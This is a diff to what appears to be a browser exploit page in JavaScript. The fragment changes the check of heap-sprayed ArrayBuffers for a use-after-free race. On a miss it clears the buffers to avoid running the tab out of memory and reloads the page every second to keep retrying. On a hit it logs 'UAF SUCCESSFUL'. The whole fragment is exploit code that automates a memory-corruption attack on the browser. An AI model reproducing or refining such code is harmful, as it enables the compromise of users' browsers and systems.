@@ -77,14 +77,25 @@
 
         // 3. (Optional) Check if the background thread overwrote our ArrayBuffer
         function verifyCorruption() {
+            let found = false;
             for (let i = 0; i < sprayBuffers.length; i++) {
                 if (sprayBuffers[i][0] !== 0xBBBBBBBB) {
-                    log("[+] MEMORY CORRUPTION DETECTED! UAF SUCCESSFUL.");
-                    document.body.style.backgroundColor = "#500";
-                    return;
+                    found = true;
+                    break;
                 }
             }
-            log("[-] No crash or corruption detected. Refresh to try race again.");
+
+            if (found) {
+                log("[+] MEMORY CORRUPTION DETECTED! UAF SUCCESSFUL.");
+                document.body.style.backgroundColor = "#500";
+                // STOP HERE - WE WON
+            } else {
+                log("[-] No hit. Retrying in 1 second...");
+                // Clear buffers to prevent OOM crash of the whole tab
+                sprayBuffers = []; 
+                // Auto-refresh to keep the race going
+                setTimeout(() => { window.location.reload(); }, 1000);
+            }
         }
 
         // Start the exploit
